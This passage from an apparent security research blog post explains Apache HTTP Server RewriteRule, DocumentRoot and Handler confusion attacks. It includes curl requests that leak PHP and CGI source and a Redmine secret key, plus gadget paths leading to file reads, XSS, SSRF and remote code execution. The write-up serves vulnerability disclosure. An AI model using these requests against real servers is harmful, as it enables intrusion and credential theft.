<span><span>RewriteCond</span></span> <span>&#34;%{QUERY_STRING}&#34;</span> <span>&#34;(.*(?:^|&amp;))mykey=([^&amp;]*)&amp;?(.*)&amp;?$&#34;</span>
<span><span>RewriteRule</span></span> <span>&#34;(.*)&#34;</span> <span>&#34;$1?%1%3&#34;</span>
</code></pre><p>There are other <code>RewriteRule</code> that are also affected, such as rules based on caching needs or hiding file extensions:</p><pre><code><span><span>RewriteRule</span></span>  <span>&#34;^/html/(.*)$&#34;</span>  <span>&#34;/$1.html&#34;</span>
</code></pre><p>The Rule trying to save bandwidth by opting for compressed versions of static files:</p><pre><code><span><span>RewriteRule</span></span>  <span>&#34;^(.*)\.(css|js|ico|svg)&#34;</span> <span>&#34;$1\.$2.gz&#34;</span>
</code></pre><p>The rule redirecting old URLs to the main site:</p><pre><code><span><span>RewriteRule</span></span>  <span>&#34;^/oldwebsite/(.*)$&#34;</span>  <span>&#34;/$1&#34;</span>
</code></pre><p>The rule returning a 200 OK for all CORS preflight requests:</p><pre><code><span><span>RewriteCond</span></span> <span>%{REQUEST_METHOD}</span> OPTIONS
<span><span>RewriteRule</span></span> ^(.*)$ <span>$1</span><span> [R=200,L]</span>
</code></pre><p>Theoretically, as long as the target prefix of a <code>RewriteRule</code> is controllable, we can access nearly the entire filesystem. But from the real-world cases  above, extensions like <code>.html</code> and <code>.gz</code> are the restrictions that keep us from being truly free. So, can we access files outside <code>.html</code>? I am not sure if you remember the primitive of Path Truncation from the Filename Confusion earlier? By combining these two primitives, we can freely access arbitrary files on the filesystem!</p><p>The following demonstrations are all based on this unsafe <code>RewriteRule</code>:</p><pre><code><span><span>RewriteEngine</span></span> <span>On</span>
<span><span>RewriteRule</span></span>  <span>&#34;^/html/(.*)$&#34;</span>  <span>&#34;/$1.html&#34;</span>
</code></pre><h4 id="‚öîÔ∏è-Primitive-2-1-Server-Side-Source-Code-Disclosure"><a href="#‚öîÔ∏è-Primitive-2-1-Server-Side-Source-Code-Disclosure" title="‚öîÔ∏è-Primitive-2-1-Server-Side-Source-Code-Disclosure"><i></i></a>‚öîÔ∏è Primitive 2-1. Server-Side Source Code Disclosure</h4><p>Let‚Äôs introduce the first primitive of DocumentRoot Confusion ‚Äî <strong>Arbitrary Server-Side Source Code Disclosure</strong>!</p><p>Since Apache HTTP Server decides whether to consider a file as a Server-Side Script based on the current directory or virtual host configuration, accessing target via an absolute path can confuse Httpd‚Äôs logic, causing it to leak contents that should have been executed as code.</p><h5 id="‚úîÔ∏è-2-1-1-Disclose-CGI-Source-Code"><a href="#‚úîÔ∏è-2-1-1-Disclose-CGI-Source-Code" title="‚úîÔ∏è-2-1-1-Disclose-CGI-Source-Code"><i></i></a>‚úîÔ∏è 2-1-1. Disclose CGI Source Code</h5><p>Starting with the disclosure of server-side CGI source code, since <code>mod_cgi</code> binds the CGI folder to a specified URL prefix via <code>ScriptAlias</code>, directly accessing a CGI file using its absolute path can leak its source code due to the change of URL prefix.</p><pre><code>$ curl http://server/cgi-bin/download.cgi
 
$ curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
 
 
 
 
</code></pre><h5 id="‚úîÔ∏è-2-1-2-Disclose-PHP-Source-Code"><a href="#‚úîÔ∏è-2-1-2-Disclose-PHP-Source-Code" title="‚úîÔ∏è-2-1-2-Disclose-PHP-Source-Code"><i></i></a>‚úîÔ∏è 2-1-2. Disclose PHP Source Code</h5><p>Next is the disclosure of server-side PHP source code. Given that PHP has numerous use cases, if PHP environments are applied only to specific directories or virtual hosts (which is common in web hosting), accessing PHP files from a virtual host which didn‚Äôt support PHP can disclose the source code!</p><p>For example, <code>www.local</code> and <code>static.local</code> are two websites hosted on the same server; <code>www.local</code> allows PHP execution while <code>static.local</code> only serves static files. Hence, you can disclose sensitive info from <code>config.php</code> like this:</p><pre><code>$ curl http://www.local/config.php
 
$ curl http://www.local/var/www.local/config.php%3F -H <span>&#34;Host: static.local&#34;</span>
 
</code></pre><h4 id="‚öîÔ∏è-Primitive-2-2-Local-Gadgets-Manipulation"><a href="#‚öîÔ∏è-Primitive-2-2-Local-Gadgets-Manipulation" title="‚öîÔ∏è-Primitive-2-2-Local-Gadgets-Manipulation"><i></i></a>‚öîÔ∏è Primitive 2-2. Local Gadgets Manipulation!</h4><p>Next up is our second primitive ‚Äî <strong>Local Gadgets Manipulation</strong>.</p><p>First, when we talked about ‚Äúaccessing any file on the filesystem,‚Äù did you wonder: ‚ÄúHey, could an unsafe <code>RewriteRule</code> access <code>/etc/passwd</code>?‚Äù The answer is Yes, and also no. What?</p><p>Technically, the server does check if <code>/etc/passwd</code> exists, but Apache HTTP Server‚Äôs built-in access control blocks our access. Here‚Äôs a snippet from Apache HTTP Server‚Äôs <a href="https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115" rel="noopener" target="_blank">configuration template</a>:</p><pre><code><span>&lt;Directory /&gt;</span>
    <span>AllowOverride</span> None
    <span>Require</span> <span>all</span> denied
<span>&lt;/Directory&gt;</span>
</code></pre><p>You‚Äôll notice it defaults to blocking access to the root directory <code>/</code> (<code>Require all denied</code>). So our ‚Äúarbitrary file access‚Äù ability seems a bit less ‚Äúany.‚Äù Does that mean the show‚Äôs over? Not really! We have already broken the trust of only-allowed-access to the DocumentRoot, it‚Äôs a significant step forward!</p><p>A closer inspection of different Httpd distributions reveals that <a href="https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165" rel="noopener" target="_blank">Debian/Ubuntu</a> operating systems by default allow <code>/usr/share</code>:</p><pre><code><span>&lt;Directory /usr/share&gt;</span>
    <span>AllowOverride</span> None
    <span>Require</span> <span>all</span> granted
<span>&lt;/Directory&gt;</span>
</code></pre><p>So, the next step is to ‚Äúsqueeze‚Äù all possibilities within this directory. All available resources, such as existing tutorials, documentation, unit test files, and even programming languages like PHP, Python, and even PHP modules could become targets for our abuse!</p><p><em>P.S. Of course, the exploitation here is based on the Httpd distributed by Ubuntu/Debian operating systems. However, in practice, we have also found that some applications remove the <code>Require all denied</code> line from the root directory, allowing direct access to <code>/etc/passwd</code>.</em></p><p><img alt="" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKJrXWc1pRe83lMXR6IZ4Tpu5di9_ciSCcZ3qHuCeG5LIX-QM8BFEv2hkWHB6IjsemByDDnj9TWPEaVwmcqrMvjjYprurMEwIrqtCQr8uuZfaAgBIPEsuIsCxUw5iOBsusQpR0ANavJdnA42gMONB2tKvJjunQgn-E9K2PxOJQqDzXiH_S8RT7qt3bsPk/s16000/cdfa0bc047573a4162a57c6f2.png"/></p><h5 id="‚úîÔ∏è-2-2-1-Local-Gadget-to-Information-Disclosure"><a href="#‚úîÔ∏è-2-2-1-Local-Gadget-to-Information-Disclosure" title="‚úîÔ∏è-2-2-1-Local-Gadget-to-Information-Disclosure"><i></i></a>‚úîÔ∏è 2-2-1. Local Gadget to Information Disclosure</h5><p>Let‚Äôs hunt for potentially exploitable files in this directory. First off, if the target Apache HTTP Server has the <code>websocketd</code> service installed, the default package includes an example PHP script <code>dump-env.php</code> under <code>/usr/share/doc/websocketd/examples/php/</code>. If there‚Äôs a PHP environment on the target server, this script can be accessed directly to leak sensitive environment variables.</p><p>Additionally, if the target has services like Nginx or Jetty installed, though <code>/usr/share</code> is theoretically a read-only copy for package installation, these services still place their default Web Roots under <code>/usr/share</code>, making it possible to leak sensitive web application information, such as the <code>web.xml</code> in Jetty.</p><ul>
<li>/usr/share/nginx/html/</li>
<li>/usr/share/jetty9/etc/</li>
<li>/usr/share/jetty9/webapps/</li>
</ul><p>Here‚Äôs a simple demonstration using <code>setup.php</code> from the <code>Davical</code> package, which exists as a read-only copy, to leak contents of <code>phpinfo()</code>.</p><p><img alt="" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTuCW-TdAMpfcv4_UpQZ6h1zkTpzexz1576-jfqEP-JRxg57wgEr-AKyFAAHpXYUUlujwK4EpCTe7FQWiwdJLH0_OnusIj-rKkpJlT28frBr6EnDsV7aiK3Ys98v2EU5QcS5EG1yV4dQBRc-tMKWZNv9WSTYXxBjrzgH95oXW_sdEZTKkaBcgmKeMq80s/s16000/cdfa0bc047573a4162a57c6e9.png"/></p><h5 id="‚úîÔ∏è-2-2-2-Local-Gadget-to-XSS"><a href="#‚úîÔ∏è-2-2-2-Local-Gadget-to-XSS" title="‚úîÔ∏è-2-2-2-Local-Gadget-to-XSS"><i></i></a>‚úîÔ∏è 2-2-2. Local Gadget to XSS</h5><p>Next, how to turn this primitive into XSS? On the Ubuntu Desktop environment, LibreOffice, an open-source office suite, is installed by default. We can leverage the language switch feature in the help files to achieve XSS.</p><p><em><strong>Path: /usr/share/libreoffice/help/help.html</strong></em></p><pre><code>    <span>var</span> url = <span>window</span>.location.href;
    <span>var</span> n = url.indexOf(<span>&#39;?&#39;</span>);
    <span>if</span> (n != <span>-1</span>) {
        
        <span>var</span> version = getParameterByName(<span>&#34;Version&#34;</span>, url);
        <span>var</span> query = url.substr(n + <span>1</span>, url.length);
        <span>var</span> newURL = version + <span>&#39;/index.html?&#39;</span> + query;
        <span>window</span>.location.replace(newURL);
    } <span>else</span> {
        <span>window</span>.location.replace(<span>&#39;latest/index.html&#39;</span>);
    }
</code></pre><p>Thus, even if the target hasn‚Äôt deployed any web application, we can still create XSS using an unsafe <code>RewriteRule</code> through files that come within the operating system.</p><p><img alt="" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiA8rjQ9A9YfxH-xjObFiPJDCjaIWDZHWdzABhUb07Tzm-mhVxEtzG4I7VHdpDKlfguFgsrRHOCC8x1bUoVZgSTAMA8JxQRPoGuEMPDSAuesu7sZQsqIN5hVxN3utosOOXZkkDjsXt5r_vg-WWrGkOEvdnnK3WLFeH0RZzAfhq_-svBDrz5LuagiFnml7A/s16000/cdfa0bc047573a4162a57c6ea.png"/></p><h5 id="‚úîÔ∏è-2-2-3-Local-Gadget-to-LFI"><a href="#‚úîÔ∏è-2-2-3-Local-Gadget-to-LFI" title="‚úîÔ∏è-2-2-3-Local-Gadget-to-LFI"><i></i></a>‚úîÔ∏è 2-2-3. Local Gadget to LFI</h5><p>What about arbitrary file reading? If the target server has PHP or frontend packages installed, like JpGraph, jQuery-jFeed, or even WordPress or Moodle plugins, their tutorials or debug consoles can become our gadgets, for example:</p><ul>
<li>/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php</li>
<li>/usr/share/javascript/jquery-jfeed/proxy.php</li>
<li>/usr/share/moodle/mod/assignment/type/wims/getcsv.php</li>
</ul><p>Here‚Äôs a simple example exploiting <code>proxy.php</code> from jQuery-jFeed to read <code>/etc/passwd</code>:</p><p><img alt="" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjVxic5R13CDXyuUsWVKK4AJJsCZpEb4az7_cdfmY1Vs45svTJfkI_1cl1EgwPQf1fZyvPR7GbSTzfEU3W0EuQ4EGvXFqZfVnQog0MZVwhXvc1ET0IPUWjcrn4KZSJTVw1bxj4yhOsom0RD0Fu7vfAa4QZlXYyL03z5d7VfIxnDbolbxQGBY369j9CcqJk/s16000/fb48778b63a5eead717f13f1d.png"/></p><h5 id="‚úîÔ∏è-2-2-4-Local-Gadget-to-SSRF"><a href="#‚úîÔ∏è-2-2-4-Local-Gadget-to-SSRF" title="‚úîÔ∏è-2-2-4-Local-Gadget-to-SSRF"><i></i></a>‚úîÔ∏è 2-2-4. Local Gadget to SSRF</h5><p>Finding an SSRF vulnerability is also a piece of cake, for instance, MagpieRSS offers a <code>magpie_debug.php</code> file, which is fabulous gadget for exploiting:</p><ul>
<li>/usr/share/php/magpierss/scripts/magpie_debug.php</li>
</ul><h5 id="‚úîÔ∏è-2-2-5-Local-Gadget-to-RCE"><a href="#‚úîÔ∏è-2-2-5-Local-Gadget-to-RCE" title="‚úîÔ∏è-2-2-5-Local-Gadget-to-RCE"><i></i></a>‚úîÔ∏è 2-2-5. Local Gadget to RCE</h5><p>So, can we achieve RCE? Hold on, let‚Äôs take it step by step! First, This primitive can reapply all known existing attacks again, like an old version of PHPUnit left behind by development or third-party dependencies, can be directly exploited using <a href="https://github.com/vulhub/vulhub/tree/master/phpunit/CVE-2017-9841" rel="noopener" target="_blank">CVE-2017-9841</a> to execute arbitrary code. Or phpLiteAdmin installed with a read-only copy, which by default has the password <code>admin</code>. By now, you should see the vast potential of Local Gadgets Manipulation. What remains is to discover even more powerful and universal gadgets!</p><h4 id="‚öîÔ∏è-Primitive-2-3-Jailbreak-from-Local-Gadgets"><a href="#‚öîÔ∏è-Primitive-2-3-Jailbreak-from-Local-Gadgets" title="‚öîÔ∏è-Primitive-2-3-Jailbreak-from-Local-Gadgets"><i></i></a>‚öîÔ∏è Primitive 2-3. Jailbreak from Local Gadgets</h4><p>You might ask: ‚ÄúCan‚Äôt we really break out of <code>/usr/share</code>?‚Äù Of course, we can, that brings out our third primitive ‚Äî <strong>Jailbreak from <code>/usr/share</code></strong>!</p><p>In <a href="https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L160" rel="noopener" target="_blank">Debian/Ubuntu</a> distributions of Httpd, the <code>FollowSymLinks</code> option is explicitly enabled by default. Even in non-Debian/Ubuntu versions, Apache HTTP Server also <a href="https://httpd.apache.org/docs/current/mod/core.html#options" rel="noopener" target="_blank">implicitly allows Symbolic Links</a> by default.</p><pre><code><span>&lt;Directory /&gt;</span>
    <span><span>Options</span></span> FollowSymLinks
    <span>AllowOverride</span> None
    <span>Require</span> <span>all</span> denied
<span>&lt;/Directory&gt;</span>
</code></pre><h5 id="‚úîÔ∏è-2-3-1-Jailbreak-from-Local-Gadgets"><a href="#‚úîÔ∏è-2-3-1-Jailbreak-from-Local-Gadgets" title="‚úîÔ∏è-2-3-1-Jailbreak-from-Local-Gadgets"><i></i></a>‚úîÔ∏è 2-3-1. Jailbreak from Local Gadgets</h5><p>So, any package that has a Symbolic Link in its installation directory pointing outside of <code>/usr/share</code> can become a stepping-stone to access more gadgets for further exploitation. Here are some useful Symbolic Links we‚Äôve discovered so far:</p><ul>
<li><strong>Cacti Log</strong>: <code>/usr/share/cacti/site/</code>  -&gt;  <code>/var/log/cacti/</code></li>
<li><strong>Solr Data</strong>: <code>/usr/share/solr/data/</code>  -&gt;  <code>/var/lib/solr/data</code></li>
<li><strong>Solr Config</strong>: <code>/usr/share/solr/conf/</code>  -&gt;  <code>/etc/solr/conf/</code></li>
<li><strong>MediaWiki Config</strong>: <code>/usr/share/mediawiki/config/</code>  -&gt;  <code>/var/lib/mediawiki/config/</code></li>
<li><strong>SimpleSAMLphp Config</strong>: <code>/usr/share/simplesamlphp/config/</code>  -&gt;  <code>/etc/simplesamlphp/</code></li>
</ul><h5 id="‚úîÔ∏è-2-3-2-Jailbreak-Local-Gadgets-to-Redmine-RCE"><a href="#‚úîÔ∏è-2-3-2-Jailbreak-Local-Gadgets-to-Redmine-RCE" title="‚úîÔ∏è-2-3-2-Jailbreak-Local-Gadgets-to-Redmine-RCE"><i></i></a>‚úîÔ∏è 2-3-2. Jailbreak Local Gadgets to Redmine RCE</h5><p>To wrap up our jailbreak primitive, let‚Äôs showcase how to perform an RCE using a double-hop Symbolic Link in Redmine. In the default installation of Redmine, there‚Äôs an <code>instances/</code> folder pointing to <code>/var/lib/redmine/</code>, and within <code>/var/lib/redmine/</code>, the <code>default/config/</code> folder points to the <code>/etc/redmine/default/</code> directory, which holds Redmine‚Äôs database setting and secret key.</p><pre><code><span>$</span><span> file /usr/share/redmine/instances/</span>
 symbolic link to /var/lib/redmine/
<span>$</span><span> file /var/lib/redmine/config/</span>
 symbolic link to /etc/redmine/default/
<span>$</span><span> ls /etc/redmine/default/</span>
 database.yml    secret_key.txt
</code></pre><p>Thus, through an insecure <code>RewriteRule</code> and two Symbolic Links, we can easily access the application secret key used by Redmine:</p><pre><code><span>$</span><span> curl http://server/html/usr/share/redmine/instances/default/config/secret_key.txt%3f</span>
 HTTP/1.1 200 OK
 Server: Apache/2.4.59 (Ubuntu) 
 ...
 6d222c3c3a1881c865428edb79a74405
</code></pre><p>And since Redmine is a Ruby on Rails application, the content of <code>secret_key.txt</code> is actually the key used for signing and encrypting. The next step should be familiar to those who have attacked RoR before: by embedding malicious Marshal objects, signed and encrypted with the known keys, into cookies, and then achieving remote code execution through Server-Side Deserialization!</p><p><img alt="" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhIide_p0PAiHeerwJ_mWGqDvyyDtnH7Xy6p-MjIVOk-AG5pi8DWOSj4ti6f6-zu8_NVu6G-aHlGLeSjrQmfU3cufsEgEr3jN8AAi30R_Mjz_Ce80pfSVU_H_lfpSTkyo5HPM1w0FeJdrrTl7d7jNr_Ft0_qtoMtPKw02p0F1BZM3xP_gOUY_xVJgUjTPc/s16000/fb48778b63a5eead717f13f49.png"/></p><h3 id="üî•-3-Handler-Confusion"><a href="#üî•-3-Handler-Confusion" title="üî•-3-Handler-Confusion"><i></i></a>üî• 3. Handler Confusion</h3><p>The final attack I‚Äôm going to introduce is the confusion based on Handler. This attack also leverages a piece of technical debt that has been left over from the legacy architecture of Apache HTTP Server. Let‚Äôs quickly understand this technical debt through an example ‚Äî if today you want to run the classic <code>mod_php</code> on Apache HTTP Server, which of the following two directives do you use?</p><pre><code><span>AddHandler</span> application/x-httpd-php .php
<span>AddType</span>    application/x-httpd-php .php
</code></pre><p>The answer is ‚Äî both can correctly get PHP running! Here are the two directive syntaxes, and you can see that not only are the usages similar, but even the effects are exactly the same. Why did Apache HTTP Server initially design two different directives doing the same thing?</p><pre><code><span>AddHandler </span>handler-name <span>extension </span>[<span>extension] </span>...
<span>AddType </span>media-type <span>extension </span>[<span>extension] </span>...
</code></pre><p>Actually, <code>handler-name</code> and <code>media-type</code> represent different fields within Httpd‚Äôs internal structure, corresponding to <code>r-&gt;handler</code> and <code>r-&gt;content_type</code>, respectively. The fact that <strong>users can use them interchangeably without realizing it is thanks to a piece of code that has been in Apache HTTP Server since <a href="https://svn.apache.org/repos/asf/httpd/httpd/branches/1.3.x/src/main/http_config.c" rel="noopener" target="_blank">its early development in 1996</a></strong>:</p><p><em><strong>Path: <a href="https://github.com/apache/httpd/blob/2.4.58/server/config.c#L420" rel="noopener" target="_blank">server/config.c#L420</a></strong></em></p><pre><code>AP_CORE_DECLARE(<span>int</span>) ap_invoke_handler(request_rec *r) {

    

    <span>if</span> (!r-&gt;<span>handler</span>) {
        <span>if</span> (r-&gt;content_type) {
            <span>handler</span> = r-&gt;content_type;
            <span>if</span> ((p=ap_strchr_c(<span>handler</span>, <span>&#39;;&#39;</span>)) != NULL) {
                <span>char</span> *new_handler = (<span>char</span> *)apr_pmemdup(r-&gt;pool, <span>handler</span>,
                                                        p - <span>handler</span> + <span>1</span>);
                <span>char</span> *p2 = new_handler + (p - <span>handler</span>);
                <span>handler</span> = new_handler;

                
                <span>while</span> (p2 &gt; <span>handler</span> &amp;&amp; p2[<span>-1</span>] == <span>&#39; &#39;</span>)
                    --p2; 

                *p2=<span>&#39;\0&#39;</span>;
            }
        }
        <span>else</span> {
            <span>handler</span> = AP_DEFAULT_HANDLER_NAME;
        }

        r-&gt;<span>handler</span> = <span>handler</span>;
    }

    result = ap_run_handler(r);
</code></pre><p>You can see that before entering the <code>ap_run_handler()</code>, if <code>r-&gt;handler</code> is empty, the content of the <code>r-&gt;content_type</code> is used as the final module handler. This is also why <code>AddType</code> and <code>AddHandler</code> have the identical effect, because the <code>media-type</code> is eventually converted into the <code>handler-name</code> before handling. So, our third Handler Confusion is mainly developed around this behavior.</p><h4 id="‚öîÔ∏è-Primitive-3-1-Overwrite-the-Handler"><a href="#‚öîÔ∏è-Primitive-3-1-Overwrite-the-Handler" title="‚öîÔ∏è-Primitive-3-1-Overwrite-the-Handler"><i></i></a>‚öîÔ∏è Primitive 3-1. Overwrite the Handler</h4><p>By understanding this conversion mechanism, the first primitive is ‚Äî <strong>Overwrite the Handler</strong>. Imagine if today the target Apache HTTP Server uses <code>AddType</code> to run PHP.</p><pre><code><span>AddType</span> application/x-httpd-php  .php
</code></pre><p>In the normal process, when accessing <code>http://server/config.php</code>, <code>mod_mime</code>, during the <code>type_checker</code> phase, Httpd copies the corresponding content into <code>r-&gt;content_type</code> based on the file extension set by <code>AddType</code>. Since <code>r-&gt;handler</code> is not assigned during the entire HTTP lifecycle, <code>ap_invoke_handler()</code> will treat <code>r-&gt;content_type</code> as the handler, ultimately calling <code>mod_php</code> to handle the request.</p><p>However, what happens if any module ‚Äúaccidentally‚Äù overwrites <code>r-&gt;content_type</code> before reaching <code>ap_invoke_handler()</code>?</p><h5 id="‚úîÔ∏è-3-1-1-Overwrite-Handler-to-Disclose-PHP-Source-Code"><a href="#‚úîÔ∏è-3-1-1-Overwrite-Handler-to-Disclose-PHP-Source-Code" title="‚úîÔ∏è-3-1-1-Overwrite-Handler-to-Disclose-PHP-Source-Code"><i></i></a>‚úîÔ∏è 3-1-1. Overwrite Handler to Disclose PHP Source Code</h5><p>The first exploitation of this primitive is to disclose arbitrary PHP source code by the ‚Äúaccidentally-overwrite‚Äù. This technique was first mentioned by Max Dmitriev in his research presented at ZeroNights 2021 (kudos to him!), and you can check his slides here:</p><blockquote>
<p><a href="https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf" rel="noopener" target="_blank">Apache 0day bug, which still nobody knows of, and which was fixed accidentally</a></p>
</blockquote><p>Max Dmitriev observed that by sending an incorrect <code>Content-Length</code>, the remote Httpd server would trigger an unexpected error and inadvertently return the source code of PHP script. Upon investigating the process, he discovered that the issue was due to ModSecurity not properly handling the return value of <code>AP_FILTER_ERROR</code> while using the Apache Portable Runtime (APR) library, leading to a <a href="https://github.com/owasp-modsecurity/ModSecurity/issues/2514" rel="noopener" target="_blank">double response</a>. When an error occurred, Httpd attempts to send out HTML error messages, thus accidentally overwriting <code>r-&gt;content_type</code> to <code>text/html</code>.</p><p><img alt="" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi00fJkIuLMpYNZNfjlS3pFTtkFOvvnsYvuZEcOFh3mOF8EFOlFP-XnOAi6L95ksvgbwWJugS7Q01RT5EGLJr7lwS_Ov8gFg8QCZrjAlkjHfIpBDKJItq2ZUn7VqXUZ5biUBjrs48_qaZ0jZDAMXwaJ7HDQg0sVU8Gy-BrmSs6se0nBolqfUymNLXYVpnA/s16000/cdfa0bc047573a4162a57c6ed.png"/></p><p>Because ModSecurity did not properly handle the return values, the internal HTTP lifecycle that should have stopped continued. This ‚Äúside effect‚Äù also overwrote the originally added <code>Content-Type</code>, resulting in files that should have been processed as PHP being treated as plain documents, exposing its source code and sensitive settings. ü§´</p><pre><code><span>$</span><span> curl -v http://127.0.0.1/info.php -H <span>&#34;Content-Length: x&#34;</span></span>
<span>&gt;</span><span> HTTP/1.1 400 Bad Request</span>
<span>&gt;</span><span> Date: Mon, 29 Jul 2024 05:32:23 GMT</span>
<span>&gt;</span><span> Server: Apache/2.4.41 (Ubuntu)</span>
<span>&gt;</span><span> Content-Type: text/html; charset=iso-8859-1</span>

&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;400 Bad Request&lt;/title&gt;
...
&lt;?php phpinfo();?&gt;
</code></pre><p>In theory, all configurations based on <code>Content-Type</code> are vulnerable to this type of attack, so apart from the <code>php-cgi</code> paired with <code>mod_actions</code> shown in  Max‚Äôs slides, pure <code>mod_php</code> coupled with <code>AddType</code> is also affected.</p><p>It‚Äôs worth mentioning that this side effect was corrected as a <a href="https://github.com/apache/httpd/commit/3303dc4f7273e05ea9a80402b33f68cd155c146a" rel="noopener" target="_blank">request parser bug</a> in Apache HTTP Server version 2.4.44, thus treating this ‚Äúvulnerability‚Äù as fixed until I picked it up again. However, since the root cause is still ModSecurity not handling errors properly, the same behavior can still be successfully reproduced if another code path that triggers <code>AP_FILTER_ERROR</code> is found.</p><p><em>P.S. This issue was reported to ModSecurity through the official security mail on 6/20, and the Project Co-Leader suggested returning to the original <a href="https://github.com/owasp-modsecurity/ModSecurity/issues/2514" rel="noopener" target="_blank">GitHub Issue</a> for discussion.</em></p><h5 id="‚úîÔ∏è-3-1-2-Overwrite-Handler-to-‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà-‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà-‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà"><a href="#‚úîÔ∏è-3-1-2-Overwrite-Handler-to-‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà-‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà-‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà" title="‚úîÔ∏è-3-1-2-Overwrite-Handler-to-‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà-‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà-‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà"><i></i></a>‚úîÔ∏è 3-1-2. Overwrite Handler to ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà</h5><p>Based on the <a href="https://github.com/owasp-modsecurity/ModSecurity/issues/2514" rel="noopener" target="_blank">double response</a> behavior and its side effects mentioned earlier, this primitive could lead to other more cool exploitations. However, as this issue has not been fully fixed, further exploitation will be disclosed after the issue is fully resolved.</p><h4 id="‚öîÔ∏è-Primitive-3-2-Invoke-Arbitrary-Handlers"><a href="#‚öîÔ∏è-Primitive-3-2-Invoke-Arbitrary-Handlers" title="‚öîÔ∏è-Primitive-3-2-Invoke-Arbitrary-Handlers"><i></i></a>‚öîÔ∏è Primitive 3-2. Invoke Arbitrary Handlers</h4><p>Let‚Äôs think more carefully about the previous Overwrite Handler primitive, although it‚Äôs caused by ModSecurity not properly handling errors, leading to the request being set with the wrong <code>Content-Type</code>, the deeper fundamental root cause should be ‚Äî <strong>when using <code>r-&gt;content_type</code>, Apache HTTP Server actually cannot distinguish its semantics; this field can be set by directive during the request phase or used as the <code>Content-Type</code> header in the server response</strong>.</p><p>Theoretically, if you can control the <code>Content-Type</code> header in the server response, you could invoke arbitrary module handlers through this legacy code snippet. This is the last primitive of Handler Confusion ‚Äî <strong>invoking any internal module handler</strong>!</p><p>However, there‚Äôs still one last piece of the puzzle. In Httpd, all modifications to <code>r-&gt;content_type</code> from the server response occur after that legacy code. So, even if you can control the value of that field, at that point in the HTTP lifecycle, it‚Äôs too late to do further exploitation‚Ä¶ is that right?</p><p>We turned to <a href="https://datatracker.ietf.org/doc/html/rfc3875" rel="noopener" target="_blank">RFC 3875</a> for a rescue! RFC 3875 is a specification about CGI, and <a href="https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2" rel="noopener" target="_blank">Section 6.2.2</a> defines a Local Redirect Response behavior:</p><blockquote>
<p>The CGI script can return a URI path and query-string (‚Äòlocal-pathquery‚Äô) for a local resource in a Location header field. This indicates to the server that it should reprocess the request using the path specified.</p>
</blockquote><p>Simply put, the specification mandates that under certain conditions, CGI must use Server-Side resources to handle redirects. A close examination of <code>mod_cgi</code> implementation of this specification reveals:</p><p><em><strong>Path: <a href="https://github.com/apache/httpd/blob/2.4.58/modules/generators/mod_cgi.c#L983" rel="noopener" target="_blank">modules/generators/mod_cgi.c#L983</a></strong></em></p><pre><code>    <span>if</span> ((ret = ap_scan_script_header_err_brigade_ex(r, bb, sbuf,          
                                                    APLOG_MODULE_INDEX)))
    {
        ret = log_script(r, conf, ret, dbuf, sbuf, bb, script_err);

        

        <span>if</span> (ret == HTTP_NOT_MODIFIED) {
            <span><span>r</span>-&gt;</span>status = ret;
            return OK;
        }

        return ret;
    }

    <span><span>location</span> = apr_table_get(r-&gt;</span>headers_out, <span>&#34;Location&#34;</span>);

    <span><span>if</span> (location &amp;&amp; r-&gt;</span>status == <span>200</span>) {
        
    }

    <span><span>if</span> (location &amp;&amp; location[0] == &#39;/&#39; &amp;&amp; r-&gt;</span>status == <span>200</span>) {          
        
        <span><span>r</span>-&gt;</span>method = <span>&#34;GET&#34;</span>;
        <span><span>r</span>-&gt;</span>method_number = M_GET;

        
        <span><span>apr_table_unset</span>(r-&gt;</span>headers_in, <span>&#34;Content-Length&#34;</span>);

        ap_internal_redirect_handler(location, r);                     
        return OK;
    }
</code></pre><p>Initially, <code>mod_cgi</code> executes<sup>[1]</sup> CGI and scans its output to set the corresponding headers such as <code>Status</code> and <code>Content-Type</code>. If<sup>[2]</sup> the returned <code>Status</code> is 200 and the <code>Location</code> header starts with a <code>/</code>, the response is treated as a Server-Side Redirection and should be processed<sup>[3]</sup> internally. A closer look at the implementation of <code>ap_internal_redirect_handler()</code> shows:</p><p><em><strong>Path: <a href="https://github.com/apache/httpd/blob/2.4.58/modules/http/http_request.c#L800" rel="noopener" target="_blank">modules/http/http_request.c#L800</a></strong></em></p><pre><code><span>AP_DECLARE(<span>void</span>)</span> ap<span>_internal_redirect_handler(<span>const</span> <span>char</span> <span>*</span><span>new_uri</span>, <span>request_rec</span> <span>*</span><span>r</span>)</span>
{
    <span>int</span> access_status;
    request_rec *<span>new</span> = internal<span>_internal_redirect(<span>new_uri</span>, <span>r</span>)</span>;    

    
    <span>if</span> (!<span>new</span>) {
        return;
    }

    <span>if</span> (r-&gt;handler)
        ap<span>_set_content_type(<span>new</span>, <span>r</span>-&gt;<span>content_type</span>)</span>;                
    access_status = ap<span>_process_request_internal(<span>new</span>)</span>;             
    <span>if</span> (access_status<span> == </span>OK) {
